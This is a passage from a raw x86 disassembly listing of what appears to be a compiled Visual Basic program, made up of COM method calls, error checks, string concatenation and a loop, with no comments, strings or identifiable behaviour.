  40390c:	8b 8d d8 fe ff ff    	mov    -0x128(%ebp),%ecx
  403912:	8b 11                	mov    (%ecx),%edx
  403914:	89 95 10 ff ff ff    	mov    %edx,-0xf0(%ebp)
  40391a:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40391d:	50                   	push   %eax
  40391e:	8b 8d 10 ff ff ff    	mov    -0xf0(%ebp),%ecx
  403924:	8b 11                	mov    (%ecx),%edx
  403926:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  40392c:	50                   	push   %eax
  40392d:	ff 52 14             	call   *0x14(%edx)
  403930:	db e2                	fnclex
  403932:	89 85 0c ff ff ff    	mov    %eax,-0xf4(%ebp)
  403938:	83 bd 0c ff ff ff 00 	cmpl   $0x0,-0xf4(%ebp)
  40393f:	7d 23                	jge    0x403964
  403941:	6a 14                	push   $0x14
  403943:	68 cc 2c 40 00       	push   $0x402ccc
  403948:	8b 8d 10 ff ff ff    	mov    -0xf0(%ebp),%ecx
  40394e:	51                   	push   %ecx
  40394f:	8b 95 0c ff ff ff    	mov    -0xf4(%ebp),%edx
  403955:	52                   	push   %edx
  403956:	ff 15 38 10 40 00    	call   *0x401038
  40395c:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
  403962:	eb 0a                	jmp    0x40396e
  403964:	c7 85 d4 fe ff ff 00 	movl   $0x0,-0x12c(%ebp)
  40396b:	00 00 00 
  40396e:	8b 45 a8             	mov    -0x58(%ebp),%eax
  403971:	89 85 08 ff ff ff    	mov    %eax,-0xf8(%ebp)
  403977:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40397a:	51                   	push   %ecx
  40397b:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  403981:	8b 02                	mov    (%edx),%eax
  403983:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  403989:	51                   	push   %ecx
  40398a:	ff 50 58             	call   *0x58(%eax)
  40398d:	db e2                	fnclex
  40398f:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  403995:	83 bd 04 ff ff ff 00 	cmpl   $0x0,-0xfc(%ebp)
  40399c:	7d 23                	jge    0x4039c1
  40399e:	6a 58                	push   $0x58
  4039a0:	68 ec 2c 40 00       	push   $0x402cec
  4039a5:	8b 95 08 ff ff ff    	mov    -0xf8(%ebp),%edx
  4039ab:	52                   	push   %edx
  4039ac:	8b 85 04 ff ff ff    	mov    -0xfc(%ebp),%eax
  4039b2:	50                   	push   %eax
  4039b3:	ff 15 38 10 40 00    	call   *0x401038
  4039b9:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
  4039bf:	eb 0a                	jmp    0x4039cb
  4039c1:	c7 85 d0 fe ff ff 00 	movl   $0x0,-0x130(%ebp)
  4039c8:	00 00 00 
  4039cb:	68 18 2d 40 00       	push   $0x402d18
  4039d0:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4039d3:	51                   	push   %ecx
  4039d4:	68 00 2d 40 00       	push   $0x402d00
  4039d9:	ff 15 34 10 40 00    	call   *0x401034
  4039df:	8b d0                	mov    %eax,%edx
  4039e1:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4039e4:	ff 15 20 11 40 00    	call   *0x401120
  4039ea:	50                   	push   %eax
  4039eb:	8b 55 bc             	mov    -0x44(%ebp),%edx
  4039ee:	52                   	push   %edx
  4039ef:	ff 15 34 10 40 00    	call   *0x401034
  4039f5:	8b d0                	mov    %eax,%edx
  4039f7:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4039fa:	ff 15 20 11 40 00    	call   *0x401120
  403a00:	50                   	push   %eax
  403a01:	68 08 2d 40 00       	push   $0x402d08
  403a06:	ff 15 34 10 40 00    	call   *0x401034
  403a0c:	8b d0                	mov    %eax,%edx
  403a0e:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  403a11:	ff 15 20 11 40 00    	call   *0x401120
  403a17:	50                   	push   %eax
  403a18:	ff 15 f4 10 40 00    	call   *0x4010f4
  403a1e:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403a21:	50                   	push   %eax
  403a22:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403a25:	51                   	push   %ecx
  403a26:	8d 55 bc             	lea    -0x44(%ebp),%edx
  403a29:	52                   	push   %edx
  403a2a:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403a2d:	50                   	push   %eax
  403a2e:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403a31:	51                   	push   %ecx
  403a32:	6a 05                	push   $0x5
  403a34:	ff 15 f0 10 40 00    	call   *0x4010f0
  403a3a:	83 c4 18             	add    $0x18,%esp
  403a3d:	8d 55 a8             	lea    -0x58(%ebp),%edx
  403a40:	52                   	push   %edx
  403a41:	8d 45 ac             	lea    -0x54(%ebp),%eax
  403a44:	50                   	push   %eax
  403a45:	6a 02                	push   $0x2
  403a47:	ff 15 28 10 40 00    	call   *0x401028
  403a4d:	83 c4 0c             	add    $0xc,%esp
  403a50:	c7 45 fc 0b 00 00 00 	movl   $0xb,-0x4(%ebp)
  403a57:	6a 00                	push   $0x0
  403a59:	68 70 2d 40 00       	push   $0x402d70
  403a5e:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403a61:	51                   	push   %ecx
  403a62:	ff 15 bc 10 40 00    	call   *0x4010bc
  403a68:	8d 55 98             	lea    -0x68(%ebp),%edx
  403a6b:	52                   	push   %edx
  403a6c:	8d 45 c8             	lea    -0x38(%ebp),%eax
  403a6f:	50                   	push   %eax
  403a70:	ff 15 0c 11 40 00    	call   *0x40110c
  403a76:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  403a7d:	c7 85 60 ff ff ff d4 	movl   $0x402dd4,-0xa0(%ebp)
  403a84:	2d 40 00 
  403a87:	c7 85 58 ff ff ff 08 	movl   $0x8,-0xa8(%ebp)
  403a8e:	00 00 00 
  403a91:	c7 85 40 ff ff ff 18 	movl   $0x402d18,-0xc0(%ebp)
  403a98:	2d 40 00 
  403a9b:	c7 85 38 ff ff ff 08 	movl   $0x8,-0xc8(%ebp)
  403aa2:	00 00 00 
  403aa5:	b8 10 00 00 00       	mov    $0x10,%eax
  403aaa:	e8 41 d8 ff ff       	call   0x4012f0
  403aaf:	8b cc                	mov    %esp,%ecx
  403ab1:	8b 95 58 ff ff ff    	mov    -0xa8(%ebp),%edx
  403ab7:	89 11                	mov    %edx,(%ecx)
  403ab9:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  403abf:	89 41 04             	mov    %eax,0x4(%ecx)
  403ac2:	8b 95 60 ff ff ff    	mov    -0xa0(%ebp),%edx
  403ac8:	89 51 08             	mov    %edx,0x8(%ecx)
  403acb:	8b 85 64 ff ff ff    	mov    -0x9c(%ebp),%eax
  403ad1:	89 41 0c             	mov    %eax,0xc(%ecx)
  403ad4:	b8 10 00 00 00       	mov    $0x10,%eax
  403ad9:	e8 12 d8 ff ff       	call   0x4012f0
  403ade:	8b cc                	mov    %esp,%ecx
  403ae0:	8b 95 38 ff ff ff    	mov    -0xc8(%ebp),%edx
  403ae6:	89 11                	mov    %edx,(%ecx)
  403ae8:	8b 85 3c ff ff ff    	mov    -0xc4(%ebp),%eax
  403aee:	89 41 04             	mov    %eax,0x4(%ecx)
  403af1:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  403af7:	89 51 08             	mov    %edx,0x8(%ecx)
  403afa:	8b 85 44 ff ff ff    	mov    -0xbc(%ebp),%eax
  403b00:	89 41 0c             	mov    %eax,0xc(%ecx)
  403b03:	6a 02                	push   $0x2
  403b05:	68 70 2e 40 00       	push   $0x402e70
  403b0a:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  403b0d:	51                   	push   %ecx
  403b0e:	ff 15 90 10 40 00    	call   *0x401090
  403b14:	50                   	push   %eax
  403b15:	ff 15 10 11 40 00    	call   *0x401110
  403b1b:	83 c4 2c             	add    $0x2c,%esp
  403b1e:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  403b25:	8b 55 08             	mov    0x8(%ebp),%edx
  403b28:	66 c7 42 50 01 00    	movw   $0x1,0x50(%edx)
  403b2e:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  403b35:	ba 88 2e 40 00       	mov    $0x402e88,%edx
  403b3a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  403b3d:	ff 15 ec 10 40 00    	call   *0x4010ec
  403b43:	c7 45 fc 0f 00 00 00 	movl   $0xf,-0x4(%ebp)
  403b4a:	8d 45 98             	lea    -0x68(%ebp),%eax
  403b4d:	50                   	push   %eax
  403b4e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403b51:	8b 11                	mov    (%ecx),%edx
  403b53:	8b 45 08             	mov    0x8(%ebp),%eax
  403b56:	50                   	push   %eax
  403b57:	ff 92 08 07 00 00    	call   *0x708(%edx)
  403b5d:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403b60:	ff 15 10 10 40 00    	call   *0x401010
  403b66:	c7 45 fc 10 00 00 00 	movl   $0x10,-0x4(%ebp)
  403b6d:	8b 55 d8             	mov    -0x28(%ebp),%edx
  403b70:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403b73:	ff 15 ec 10 40 00    	call   *0x4010ec
  403b79:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403b7c:	51                   	push   %ecx
  403b7d:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403b80:	52                   	push   %edx
  403b81:	8b 45 08             	mov    0x8(%ebp),%eax
  403b84:	8b 08                	mov    (%eax),%ecx
  403b86:	8b 55 08             	mov    0x8(%ebp),%edx
  403b89:	52                   	push   %edx
  403b8a:	ff 91 0c 07 00 00    	call   *0x70c(%ecx)
  403b90:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  403b93:	ff 15 3c 11 40 00    	call   *0x40113c
  403b99:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403b9c:	ff 15 10 10 40 00    	call   *0x401010
  403ba2:	c7 45 fc 11 00 00 00 	movl   $0x11,-0x4(%ebp)
  403ba9:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  403bb0:	75 1c                	jne    0x403bce
  403bb2:	68 d4 62 40 00       	push   $0x4062d4
  403bb7:	68 dc 2c 40 00       	push   $0x402cdc
  403bbc:	ff 15 e0 10 40 00    	call   *0x4010e0
  403bc2:	c7 85 cc fe ff ff d4 	movl   $0x4062d4,-0x134(%ebp)
  403bc9:	62 40 00 
  403bcc:	eb 0a                	jmp    0x403bd8
  403bce:	c7 85 cc fe ff ff d4 	movl   $0x4062d4,-0x134(%ebp)
  403bd5:	62 40 00 
  403bd8:	8b 85 cc fe ff ff    	mov    -0x134(%ebp),%eax
  403bde:	8b 08                	mov    (%eax),%ecx
  403be0:	89 8d 20 ff ff ff    	mov    %ecx,-0xe0(%ebp)
  403be6:	8d 55 ac             	lea    -0x54(%ebp),%edx
  403be9:	52                   	push   %edx
  403bea:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  403bf0:	8b 08                	mov    (%eax),%ecx
  403bf2:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  403bf8:	52                   	push   %edx
  403bf9:	ff 51 14             	call   *0x14(%ecx)
  403bfc:	db e2                	fnclex
  403bfe:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  403c04:	83 bd 1c ff ff ff 00 	cmpl   $0x0,-0xe4(%ebp)
  403c0b:	7d 23                	jge    0x403c30
  403c0d:	6a 14                	push   $0x14
  403c0f:	68 cc 2c 40 00       	push   $0x402ccc
  403c14:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  403c1a:	50                   	push   %eax
  403c1b:	8b 8d 1c ff ff ff    	mov    -0xe4(%ebp),%ecx
  403c21:	51                   	push   %ecx
  403c22:	ff 15 38 10 40 00    	call   *0x401038
  403c28:	89 85 c8 fe ff ff    	mov    %eax,-0x138(%ebp)
  403c2e:	eb 0a                	jmp    0x403c3a
  403c30:	c7 85 c8 fe ff ff 00 	movl   $0x0,-0x138(%ebp)
  403c37:	00 00 00 
  403c3a:	8b 55 ac             	mov    -0x54(%ebp),%edx
  403c3d:	89 95 18 ff ff ff    	mov    %edx,-0xe8(%ebp)
  403c43:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403c46:	50                   	push   %eax
  403c47:	8b 8d 18 ff ff ff    	mov    -0xe8(%ebp),%ecx
  403c4d:	8b 11                	mov    (%ecx),%edx
  403c4f:	8b 85 18 ff ff ff    	mov    -0xe8(%ebp),%eax
  403c55:	50                   	push   %eax
  403c56:	ff 52 50             	call   *0x50(%edx)
  403c59:	db e2                	fnclex
  403c5b:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  403c61:	83 bd 14 ff ff ff 00 	cmpl   $0x0,-0xec(%ebp)
  403c68:	7d 23                	jge    0x403c8d
  403c6a:	6a 50                	push   $0x50
  403c6c:	68 ec 2c 40 00       	push   $0x402cec
  403c71:	8b 8d 18 ff ff ff    	mov    -0xe8(%ebp),%ecx
  403c77:	51                   	push   %ecx
  403c78:	8b 95 14 ff ff ff    	mov    -0xec(%ebp),%edx
  403c7e:	52                   	push   %edx
  403c7f:	ff 15 38 10 40 00    	call   *0x401038
  403c85:	89 85 c4 fe ff ff    	mov    %eax,-0x13c(%ebp)
  403c8b:	eb 0a                	jmp    0x403c97
  403c8d:	c7 85 c4 fe ff ff 00 	movl   $0x0,-0x13c(%ebp)
  403c94:	00 00 00 
  403c97:	83 3d d4 62 40 00 00 	cmpl   $0x0,0x4062d4
  403c9e:	75 1c                	jne    0x403cbc
  403ca0:	68 d4 62 40 00       	push   $0x4062d4
  403ca5:	68 dc 2c 40 00       	push   $0x402cdc
  403caa:	ff 15 e0 10 40 00    	call   *0x4010e0
  403cb0:	c7 85 c0 fe ff ff d4 	movl   $0x4062d4,-0x140(%ebp)
  403cb7:	62 40 00 
  403cba:	eb 0a                	jmp    0x403cc6
  403cbc:	c7 85 c0 fe ff ff d4 	movl   $0x4062d4,-0x140(%ebp)
  403cc3:	62 40 00 
  403cc6:	8b 85 c0 fe ff ff    	mov    -0x140(%ebp),%eax
  403ccc:	8b 08                	mov    (%eax),%ecx
  403cce:	89 8d 10 ff ff ff    	mov    %ecx,-0xf0(%ebp)
  403cd4:	8d 55 a8             	lea    -0x58(%ebp),%edx
  403cd7:	52                   	push   %edx
  403cd8:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  403cde:	8b 08                	mov    (%eax),%ecx
  403ce0:	8b 95 10 ff ff ff    	mov    -0xf0(%ebp),%edx
  403ce6:	52                   	push   %edx
  403ce7:	ff 51 14             	call   *0x14(%ecx)
  403cea:	db e2                	fnclex
  403cec:	89 85 0c ff ff ff    	mov    %eax,-0xf4(%ebp)
  403cf2:	83 bd 0c ff ff ff 00 	cmpl   $0x0,-0xf4(%ebp)
  403cf9:	7d 23                	jge    0x403d1e
  403cfb:	6a 14                	push   $0x14
  403cfd:	68 cc 2c 40 00       	push   $0x402ccc
  403d02:	8b 85 10 ff ff ff    	mov    -0xf0(%ebp),%eax
  403d08:	50                   	push   %eax
  403d09:	8b 8d 0c ff ff ff    	mov    -0xf4(%ebp),%ecx
  403d0f:	51                   	push   %ecx
  403d10:	ff 15 38 10 40 00    	call   *0x401038
  403d16:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
  403d1c:	eb 0a                	jmp    0x403d28
  403d1e:	c7 85 bc fe ff ff 00 	movl   $0x0,-0x144(%ebp)
  403d25:	00 00 00 
  403d28:	8b 55 a8             	mov    -0x58(%ebp),%edx
  403d2b:	89 95 08 ff ff ff    	mov    %edx,-0xf8(%ebp)
  403d31:	8d 45 bc             	lea    -0x44(%ebp),%eax
  403d34:	50                   	push   %eax
  403d35:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  403d3b:	8b 11                	mov    (%ecx),%edx
  403d3d:	8b 85 08 ff ff ff    	mov    -0xf8(%ebp),%eax
  403d43:	50                   	push   %eax
  403d44:	ff 52 58             	call   *0x58(%edx)
  403d47:	db e2                	fnclex
  403d49:	89 85 04 ff ff ff    	mov    %eax,-0xfc(%ebp)
  403d4f:	83 bd 04 ff ff ff 00 	cmpl   $0x0,-0xfc(%ebp)
  403d56:	7d 23                	jge    0x403d7b
  403d58:	6a 58                	push   $0x58
  403d5a:	68 ec 2c 40 00       	push   $0x402cec
  403d5f:	8b 8d 08 ff ff ff    	mov    -0xf8(%ebp),%ecx
  403d65:	51                   	push   %ecx
  403d66:	8b 95 04 ff ff ff    	mov    -0xfc(%ebp),%edx
  403d6c:	52                   	push   %edx
  403d6d:	ff 15 38 10 40 00    	call   *0x401038
  403d73:	89 85 b8 fe ff ff    	mov    %eax,-0x148(%ebp)
  403d79:	eb 0a                	jmp    0x403d85
  403d7b:	c7 85 b8 fe ff ff 00 	movl   $0x0,-0x148(%ebp)
  403d82:	00 00 00 
  403d85:	8b 45 c0             	mov    -0x40(%ebp),%eax
  403d88:	50                   	push   %eax
  403d89:	68 00 2d 40 00       	push   $0x402d00
  403d8e:	ff 15 34 10 40 00    	call   *0x401034
  403d94:	8b d0                	mov    %eax,%edx
  403d96:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  403d99:	ff 15 20 11 40 00    	call   *0x401120
  403d9f:	50                   	push   %eax
  403da0:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  403da3:	51                   	push   %ecx
  403da4:	ff 15 34 10 40 00    	call   *0x401034
  403daa:	8b d0                	mov    %eax,%edx
  403dac:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  403daf:	ff 15 20 11 40 00    	call   *0x401120
  403db5:	50                   	push   %eax
  403db6:	68 08 2d 40 00       	push   $0x402d08
  403dbb:	ff 15 34 10 40 00    	call   *0x401034
  403dc1:	8b d0                	mov    %eax,%edx
  403dc3:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  403dc6:	ff 15 20 11 40 00    	call   *0x401120
  403dcc:	8b d0                	mov    %eax,%edx
  403dce:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403dd1:	83 c1 3c             	add    $0x3c,%ecx
  403dd4:	ff 15 ec 10 40 00    	call   *0x4010ec
  403dda:	8d 55 b0             	lea    -0x50(%ebp),%edx
  403ddd:	52                   	push   %edx
  403dde:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  403de1:	50                   	push   %eax
  403de2:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  403de5:	51                   	push   %ecx
  403de6:	8d 55 b8             	lea    -0x48(%ebp),%edx
  403de9:	52                   	push   %edx
  403dea:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403ded:	50                   	push   %eax
  403dee:	6a 05                	push   $0x5
  403df0:	ff 15 f0 10 40 00    	call   *0x4010f0
  403df6:	83 c4 18             	add    $0x18,%esp
  403df9:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  403dfc:	51                   	push   %ecx
  403dfd:	8d 55 ac             	lea    -0x54(%ebp),%edx
  403e00:	52                   	push   %edx
  403e01:	6a 02                	push   $0x2
  403e03:	ff 15 28 10 40 00    	call   *0x401028
  403e09:	83 c4 0c             	add    $0xc,%esp
  403e0c:	c7 45 fc 12 00 00 00 	movl   $0x12,-0x4(%ebp)
  403e13:	8d 45 98             	lea    -0x68(%ebp),%eax
  403e16:	50                   	push   %eax
  403e17:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e1a:	8b 11                	mov    (%ecx),%edx
  403e1c:	8b 45 08             	mov    0x8(%ebp),%eax
  403e1f:	50                   	push   %eax
  403e20:	ff 92 f8 06 00 00    	call   *0x6f8(%edx)
  403e26:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  403e29:	ff 15 10 10 40 00    	call   *0x401010
  403e2f:	c7 45 fc 13 00 00 00 	movl   $0x13,-0x4(%ebp)
  403e36:	68 c0 2e 40 00       	push   $0x402ec0
  403e3b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e3e:	8b 11                	mov    (%ecx),%edx
  403e40:	8b 45 08             	mov    0x8(%ebp),%eax
  403e43:	50                   	push   %eax
  403e44:	ff 92 10 07 00 00    	call   *0x710(%edx)
  403e4a:	c7 45 fc 14 00 00 00 	movl   $0x14,-0x4(%ebp)
  403e51:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403e54:	8b 11                	mov    (%ecx),%edx
  403e56:	8b 45 08             	mov    0x8(%ebp),%eax
  403e59:	50                   	push   %eax
  403e5a:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  403e60:	50                   	push   %eax
  403e61:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403e64:	51                   	push   %ecx
  403e65:	ff 15 54 10 40 00    	call   *0x401054
  403e6b:	89 85 20 ff ff ff    	mov    %eax,-0xe0(%ebp)
  403e71:	68 c0 2e 40 00       	push   $0x402ec0
  403e76:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  403e7c:	8b 02                	mov    (%edx),%eax
  403e7e:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  403e84:	51                   	push   %ecx
  403e85:	ff 90 ac 00 00 00    	call   *0xac(%eax)
  403e8b:	db e2                	fnclex
  403e8d:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  403e93:	83 bd 1c ff ff ff 00 	cmpl   $0x0,-0xe4(%ebp)
  403e9a:	7d 26                	jge    0x403ec2
  403e9c:	68 ac 00 00 00       	push   $0xac
  403ea1:	68 c8 2e 40 00       	push   $0x402ec8
  403ea6:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  403eac:	52                   	push   %edx
  403ead:	8b 85 1c ff ff ff    	mov    -0xe4(%ebp),%eax
  403eb3:	50                   	push   %eax
  403eb4:	ff 15 38 10 40 00    	call   *0x401038
  403eba:	89 85 b4 fe ff ff    	mov    %eax,-0x14c(%ebp)
  403ec0:	eb 0a                	jmp    0x403ecc
  403ec2:	c7 85 b4 fe ff ff 00 	movl   $0x0,-0x14c(%ebp)
  403ec9:	00 00 00 
  403ecc:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403ecf:	ff 15 40 11 40 00    	call   *0x401140
  403ed5:	c7 45 fc 15 00 00 00 	movl   $0x15,-0x4(%ebp)
  403edc:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403edf:	8b 11                	mov    (%ecx),%edx
  403ee1:	8b 45 08             	mov    0x8(%ebp),%eax
  403ee4:	50                   	push   %eax
  403ee5:	ff 92 fc 02 00 00    	call   *0x2fc(%edx)
  403eeb:	50                   	push   %eax
  403eec:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403eef:	51                   	push   %ecx
  403ef0:	ff 15 54 10 40 00    	call   *0x401054
  403ef6:	89 85 20 ff ff ff    	mov    %eax,-0xe0(%ebp)
  403efc:	8d 95 24 ff ff ff    	lea    -0xdc(%ebp),%edx
  403f02:	52                   	push   %edx
  403f03:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  403f09:	8b 08                	mov    (%eax),%ecx
  403f0b:	8b 95 20 ff ff ff    	mov    -0xe0(%ebp),%edx
  403f11:	52                   	push   %edx
  403f12:	ff 91 e8 00 00 00    	call   *0xe8(%ecx)
  403f18:	db e2                	fnclex
  403f1a:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  403f20:	83 bd 1c ff ff ff 00 	cmpl   $0x0,-0xe4(%ebp)
  403f27:	7d 26                	jge    0x403f4f
  403f29:	68 e8 00 00 00       	push   $0xe8
  403f2e:	68 c8 2e 40 00       	push   $0x402ec8
  403f33:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  403f39:	50                   	push   %eax
  403f3a:	8b 8d 1c ff ff ff    	mov    -0xe4(%ebp),%ecx
  403f40:	51                   	push   %ecx
  403f41:	ff 15 38 10 40 00    	call   *0x401038
  403f47:	89 85 b0 fe ff ff    	mov    %eax,-0x150(%ebp)
  403f4d:	eb 0a                	jmp    0x403f59
  403f4f:	c7 85 b0 fe ff ff 00 	movl   $0x0,-0x150(%ebp)
  403f56:	00 00 00 
  403f59:	66 8b 95 24 ff ff ff 	mov    -0xdc(%ebp),%dx
  403f60:	66 89 95 fc fe ff ff 	mov    %dx,-0x104(%ebp)
  403f67:	66 c7 85 00 ff ff ff 	movw   $0x1,-0x100(%ebp)
  403f6e:	01 00 
  403f70:	66 c7 45 dc 00 00    	movw   $0x0,-0x24(%ebp)
  403f76:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  403f79:	ff 15 40 11 40 00    	call   *0x401140
  403f7f:	eb 15                	jmp    0x403f96
  403f81:	66 8b 45 dc          	mov    -0x24(%ebp),%ax
  403f85:	66 03 85 00 ff ff ff 	add    -0x100(%ebp),%ax
  403f8c:	0f 80 2d 03 00 00    	jo     0x4042bf
  403f92:	66 89 45 dc          	mov    %ax,-0x24(%ebp)
  403f96:	66 8b 4d dc          	mov    -0x24(%ebp),%cx
  403f9a:	66 3b 8d fc fe ff ff 	cmp    -0x104(%ebp),%cx
  403fa1:	0f 8f 81 02 00 00    	jg     0x404228
  403fa7:	c7 45 fc 16 00 00 00 	movl   $0x16,-0x4(%ebp)
  403fae:	8b 55 08             	mov    0x8(%ebp),%edx
  403fb1:	8b 02                	mov    (%edx),%eax
  403fb3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403fb6:	51                   	push   %ecx
  403fb7:	ff 90 fc 02 00 00    	call   *0x2fc(%eax)
  403fbd:	50                   	push   %eax
  403fbe:	8d 55 ac             	lea    -0x54(%ebp),%edx
  403fc1:	52                   	push   %edx
  403fc2:	ff 15 54 10 40 00    	call   *0x401054
  403fc8:	89 85 20 ff ff ff    	mov    %eax,-0xe0(%ebp)
  403fce:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403fd1:	50                   	push   %eax
  403fd2:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  403fd8:	8b 11                	mov    (%ecx),%edx
  403fda:	8b 85 20 ff ff ff    	mov    -0xe0(%ebp),%eax
  403fe0:	50                   	push   %eax
  403fe1:	ff 92 a8 00 00 00    	call   *0xa8(%edx)
  403fe7:	db e2                	fnclex
  403fe9:	89 85 1c ff ff ff    	mov    %eax,-0xe4(%ebp)
  403fef:	83 bd 1c ff ff ff 00 	cmpl   $0x0,-0xe4(%ebp)
  403ff6:	7d 26                	jge    0x40401e
  403ff8:	68 a8 00 00 00       	push   $0xa8
  403ffd:	68 c8 2e 40 00       	push   $0x402ec8
  404002:	8b 8d 20 ff ff ff    	mov    -0xe0(%ebp),%ecx
  404008:	51                   	push   %ecx
  404009:	8b 95 1c ff ff ff    	mov    -0xe4(%ebp),%edx
  40400f:	52                   	push   %edx
  404010:	ff 15 38 10 40 00    	call   *0x401038
  404016:	89 85 ac fe ff ff    	mov    %eax,-0x154(%ebp)
  40401c:	eb 0a                	jmp    0x404028
  40401e:	c7 85 ac fe ff ff 00 	movl   $0x0,-0x154(%ebp)
  404025:	00 00 00 
  404028:	8b 45 08             	mov    0x8(%ebp),%eax
  40402b:	8b 08                	mov    (%eax),%ecx
  40402d:	8b 55 08             	mov    0x8(%ebp),%edx
  404030:	52                   	push   %edx
  404031:	ff 91 fc 02 00 00    	call   *0x2fc(%ecx)
  404037:	50                   	push   %eax
  404038:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40403b:	50                   	push   %eax
  40403c:	ff 15 54 10 40 00    	call   *0x401054
  404042:	89 85 18 ff ff ff    	mov    %eax,-0xe8(%ebp)
  404048:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40404b:	51                   	push   %ecx
  40404c:	66 8b 55 dc          	mov    -0x24(%ebp),%dx
  404050:	52                   	push   %edx
  404051:	8b 85 18 ff ff ff    	mov    -0xe8(%ebp),%eax
  404057:	8b 08                	mov    (%eax),%ecx
  404059:	8b 95 18 ff ff ff    	mov    -0xe8(%ebp),%edx
  40405f:	52                   	push   %edx
  404060:	ff 91 f8 00 00 00    	call   *0xf8(%ecx)
  404066:	db e2                	fnclex
  404068:	89 85 14 ff ff ff    	mov    %eax,-0xec(%ebp)
  40406e:	83 bd 14 ff ff ff 00 	cmpl   $0x0,-0xec(%ebp)
  404075:	7d 26                	jge    0x40409d
  404077:	68 f8 00 00 00       	push   $0xf8
  40407c:	68 c8 2e 40 00       	push   $0x402ec8
  404081:	8b 85 18 ff ff ff    	mov    -0xe8(%ebp),%eax
  404087:	50                   	push   %eax
  404088:	8b 8d 14 ff ff ff    	mov    -0xec(%ebp),%ecx
  40408e:	51                   	push   %ecx
  40408f:	ff 15 38 10 40 00    	call   *0x401038
  404095:	89 85 a8 fe ff ff    	mov    %eax,-0x158(%ebp)
  40409b:	eb 0a                	jmp    0x4040a7
  40409d:	c7 85 a8 fe ff ff 00 	movl   $0x0,-0x158(%ebp)
  4040a4:	00 00 00 
  4040a7:	8b 55 c0             	mov    -0x40(%ebp),%edx
  4040aa:	52                   	push   %edx
  4040ab:	68 00 2d 40 00       	push   $0x402d00
  4040b0:	ff 15 34 10 40 00    	call   *0x401034
  4040b6:	8b d0                	mov    %eax,%edx
  4040b8:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4040bb:	ff 15 20 11 40 00    	call   *0x401120
  4040c1:	50                   	push   %eax
  4040c2:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4040c5:	50                   	push   %eax
  4040c6:	ff 15 34 10 40 00    	call   *0x401034
  4040cc:	8b d0                	mov    %eax,%edx
  4040ce:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4040d1:	ff 15 20 11 40 00    	call   *0x401120
